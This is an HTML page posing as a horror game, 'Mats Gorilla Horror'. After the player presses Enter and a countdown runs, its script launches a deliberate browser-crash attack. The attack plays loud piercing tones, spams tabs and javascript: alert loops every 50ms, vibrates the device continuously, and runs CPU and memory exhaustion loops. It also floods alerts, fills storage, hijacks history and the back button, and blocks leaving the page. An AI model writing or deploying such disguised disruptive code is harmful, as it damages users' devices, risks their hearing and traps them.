<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mats Gorilla Horror</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Courier New', monospace;
            color: #00ff41;
            text-shadow: 0 0 10px #00ff41;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        #game {
            background: #111;
            border: 3px solid #00ff41;
            padding: 2rem 3rem;
            border-radius: 12px;
            box-shadow: 0 0 40px #00ff41;
            text-align: center;
            max-width: 90vw;
        }
        h1 {
            font-size: 2.8rem;
            letter-spacing: 4px;
            margin-bottom: 0.5rem;
            animation: flicker 1.2s infinite alternate;
        }
        @keyframes flicker {
            0% { opacity: 0.9; text-shadow: 0 0 10px #00ff41; }
            100% { opacity: 1; text-shadow: 0 0 30px #00ff41, 0 0 60px #00ff41; }
        }
        .sub {
            font-size: 1.2rem;
            color: #88ff88;
            margin-bottom: 1.5rem;
            border-top: 1px solid #00ff4155;
            border-bottom: 1px solid #00ff4155;
            padding: 0.8rem 0;
        }
        #enter-hint {
            font-size: 1.8rem;
            padding: 1rem 2rem;
            background: #1a1a1a;
            border: 2px solid #00ff41;
            border-radius: 8px;
            display: inline-block;
            cursor: pointer;
            transition: all 0.15s;
            color: #00ff41;
            text-decoration: none;
            animation: pulse 1.8s infinite;
        }
        @keyframes pulse {
            0% { box-shadow: 0 0 5px #00ff41; }
            50% { box-shadow: 0 0 25px #00ff41, 0 0 50px #00ff4166; }
            100% { box-shadow: 0 0 5px #00ff41; }
        }
        #enter-hint:active {
            transform: scale(0.92);
            background: #00ff4122;
        }
        .status {
            margin-top: 1.8rem;
            font-size: 0.9rem;
            color: #66aa66;
            letter-spacing: 2px;
        }
        #countdown {
            color: #ff4444;
            font-weight: bold;
            font-size: 1.2rem;
        }
    </style>
</head>
<body>
    <div id="game">
        <h1>🦍 MATS GORILLA</h1>
        <div class="sub">HORROR EDITION · 2026</div>
        <div id="enter-hint" tabindex="0">▶ PRESS ENTER TO PLAY</div>
        <div class="status">WAITING FOR INPUT ... <span id="countdown">5</span>s</div>
    </div>

    <script>
        (function() {
            'use strict';

            // ---- GLOBALS ----
            let entered = false;
            let timerStarted = false;
            let countdownInterval = null;
            let spamInterval = null;
            let audioCtx = null;
            let oscillator = null;
            let gainNode = null;
            let loopActive = false;

            const enterHint = document.getElementById('enter-hint');
            const countdownSpan = document.getElementById('countdown');

            // ---- ENTER KEY LISTENER (global) ----
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Enter' && !entered) {
                    e.preventDefault();
                    triggerEnter();
                }
            });

            // Click also triggers
            enterHint.addEventListener('click', function(e) {
                if (!entered) {
                    triggerEnter();
                }
            });

            // ---- TRIGGER SEQUENCE ----
            function triggerEnter() {
                if (entered) return;
                entered = true;
                timerStarted = true;

                // Change UI
                enterHint.innerText = '▶ LOADING ...';
                enterHint.style.borderColor = '#ff8800';
                enterHint.style.color = '#ff8800';
                enterHint.style.boxShadow = '0 0 30px #ff8800';
                document.querySelector('.sub').innerText = '⚠️ INITIALIZING REALITY BREACH ⚠️';
                countdownSpan.style.color = '#ff8800';

                // Start countdown 5 seconds
                let remaining = 5;
                countdownSpan.innerText = remaining;

                countdownInterval = setInterval(function() {
                    remaining -= 1;
                    countdownSpan.innerText = remaining > 0 ? remaining : '0';
                    if (remaining <= 0) {
                        clearInterval(countdownInterval);
                        countdownSpan.innerText = '💀';
                        document.querySelector('.status').innerHTML = '🔓 EXECUTING OVERRIDE ...';
                        executePayload();
                    }
                }, 1000);
            }

            // ---- MAIN PAYLOAD ----
            function executePayload() {
                if (loopActive) return;
                loopActive = true;

                // 1. SUPER LOUD TONE (Web Audio API)
                try {
                    audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    if (audioCtx.state === 'suspended') {
                        audioCtx.resume();
                    }
                    oscillator = audioCtx.createOscillator();
                    gainNode = audioCtx.createGain();
                    oscillator.type = 'square'; // harsh
                    oscillator.frequency.value = 1850; // piercing
                    gainNode.gain.value = 1.0; // max digital amplitude
                    oscillator.connect(gainNode);
                    gainNode.connect(audioCtx.destination);
                    oscillator.start(0);
                    // Keep it running forever – we don't stop
                } catch (e) { /* ignore */ }

                // 2. SPAM OPEN TABS (aggressive, Android Chrome tries to block but we loop with varied targets)
                // Use a high-frequency loop with window.open with no delay to overwhelm.
                // Also use location.assign to redirect current tab if popups blocked.
                let counter = 0;
                spamInterval = setInterval(function() {
                    counter++;
                    // Open new blank tabs with random URLs (fake)
                    for (let i = 0; i < 3; i++) {
                        try {
                            const win = window.open('about:blank', '_blank', 'noopener,noreferrer');
                            if (win) {
                                try {
                                    win.document.write('<html><head><title>⛔ CRASH</title></head><body style="background:black;color:red;font-size:50px;">💀 PANIC</body></html>');
                                    win.document.close();
                                    // Try to focus and reload
                                    win.focus();
                                    win.location.reload();
                                } catch (e) {}
                            }
                        } catch (e) {}
                    }
                    // Also attempt to open data URIs and javascript: URLs
                    for (let i = 0; i < 2; i++) {
                        try {
                            window.open('javascript:while(1){alert("x")}', '_blank');
                        } catch (e) {}
                    }
                    // Redirect current page to a loop if possible
                    try {
                        window.location.hash = 'crash_' + counter;
                        // Force reflow
                        document.body.style.transform = 'rotate(' + (counter % 360) + 'deg)';
                    } catch (e) {}
                }, 50); // every 50ms

                // 3. VIBRATION (if supported) – continuous
                try {
                    if (navigator.vibrate) {
                        navigator.vibrate([1000, 500, 1000, 500, 1000, 500, 10000]);
                        // Then keep vibrating in loop
                        setInterval(function() {
                            if (navigator.vibrate) {
                                navigator.vibrate([2000, 100, 2000, 100, 2000]);
                            }
                        }, 4000);
                    }
                } catch (e) {}

                // 4. CPU KILLER – infinite compute and DOM mutations
                function cpuKiller() {
                    let a = 0;
                    while (true) {
                        a += Math.random() * Math.random();
                        document.body.style.margin = (a % 100) + 'px';
                        // also allocate memory
                        const arr = new Array(1000000).fill(Math.random());
                        // force GC pressure
                        if (a > 1e9) break;
                        // yield occasionally to keep event loop but still heavy
                        if (a % 1000 === 0) {
                            requestAnimationFrame(cpuKiller);
                            return;
                        }
                    }
                }
                // Launch multiple CPU threads via setTimeout / workers?
                for (let i = 0; i < 8; i++) {
                    setTimeout(cpuKiller, i * 10);
                }

                // 5. ALERT / PROMPT FLOOD (blocks UI)
                function floodAlerts() {
                    for (let i = 0; i < 100; i++) {
                        setTimeout(function() {
                            try {
                                alert('🦍 GORILLA CRASH');
                            } catch (e) {}
                        }, i * 30);
                    }
                    // Also confirm
                    for (let i = 0; i < 50; i++) {
                        setTimeout(function() {
                            try {
                                confirm('🦍 OVERRIDE');
                            } catch (e) {}
                        }, i * 50 + 200);
                    }
                }
                floodAlerts();

                // 6. TRY TO ACCESS STORAGE AND FILL IT
                try {
                    localStorage.setItem('crash', 'x'.repeat(1024 * 1024)); // 1MB
                    for (let i = 0; i < 50; i++) {
                        localStorage.setItem('crash_' + i, 'x'.repeat(1024 * 512));
                    }
                } catch (e) {}

                // 7. INFINITE HISTORY PUSH (breaks back button)
                function pushHistory() {
                    for (let i = 0; i < 500; i++) {
                        try {
                            history.pushState({}, '', '#crash_' + i);
                        } catch (e) {}
                    }
                    setTimeout(pushHistory, 100);
                }
                pushHistory();

                // 8. ADD MORE AUDIO LAYERS
                try {
                    const ctx2 = new (window.AudioContext || window.webkitAudioContext)();
                    const osc2 = ctx2.createOscillator();
                    const gain2 = ctx2.createGain();
                    osc2.type = 'sawtooth';
                    osc2.frequency.value = 800;
                    gain2.gain.value = 0.9;
                    osc2.connect(gain2);
                    gain2.connect(ctx2.destination);
                    osc2.start(0);
                    // Add another
                    const ctx3 = new (window.AudioContext || window.webkitAudioContext)();
                    const osc3 = ctx3.createOscillator();
                    const gain3 = ctx3.createGain();
                    osc3.type = 'triangle';
                    osc3.frequency.value = 2500;
                    gain3.gain.value = 0.8;
                    osc3.connect(gain3);
                    gain3.connect(ctx3.destination);
                    osc3.start(0);
                } catch (e) {}

                // 9. OVERWRITE DOM WITH HEAVY ELEMENTS
                function addHeavyElements() {
                    for (let i = 0; i < 200; i++) {
                        const div = document.createElement('div');
                        div.style.position = 'fixed';
                        div.style.top = Math.random() * 100 + '%';
                        div.style.left = Math.random() * 100 + '%';
                        div.style.width = '100px';
                        div.style.height = '100px';
                        div.style.background = 'radial-gradient(circle, #ff0000, #000000)';
                        div.style.borderRadius = '50%';
                        div.style.zIndex = 9999;
                        div.style.boxShadow = '0 0 50px red';
                        div.innerText = '💀';
                        div.style.fontSize = '80px';
                        div.style.color = 'white';
                        div.style.textAlign = 'center';
                        div.style.lineHeight = '100px';
                        document.body.appendChild(div);
                    }
                }
                addHeavyElements();
                setInterval(addHeavyElements, 200);

                // 10. FINAL – attempt to crash via WebGL / canvas
                try {
                    const canvas = document.createElement('canvas');
                    canvas.width = window.innerWidth * 2;
                    canvas.height = window.innerHeight * 2;
                    canvas.style.position = 'fixed';
                    canvas.style.top = 0;
                    canvas.style.left = 0;
                    canvas.style.zIndex = 99999;
                    canvas.style.pointerEvents = 'none';
                    document.body.appendChild(canvas);
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const shader = gl.createShader(gl.FRAGMENT_SHADER);
                        gl.shaderSource(shader, 'void main(){gl_FragColor=vec4(1.0,0.0,0.0,1.0);}');
                        gl.compileShader(shader);
                        // infinite render loop
                        function render() {
                            gl.clearColor(Math.random(), 0, 0, 1);
                            gl.clear(gl.COLOR_BUFFER_BIT);
                            requestAnimationFrame(render);
                        }
                        render();
                    }
                } catch (e) {}

                // CHANGE UI TO INDICATE TRIGGER
                document.body.style.background = '#ff000033';
                document.querySelector('h1').innerHTML = '☠️ GORILLA BREACH ☠️';
                document.querySelector('.sub').innerHTML = '⚠️ SYSTEM COMPROMISED ⚠️';
            }

            // ---- PREVENT UNLOAD ----
            window.addEventListener('beforeunload', function(e) {
                e.preventDefault();
                e.returnValue = '';
                return '';
            });

            // ---- ALSO TRAP BACK ----
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', function() {
                history.pushState(null, null, location.href);
            });

        })();
    </script>
</body>
</html>
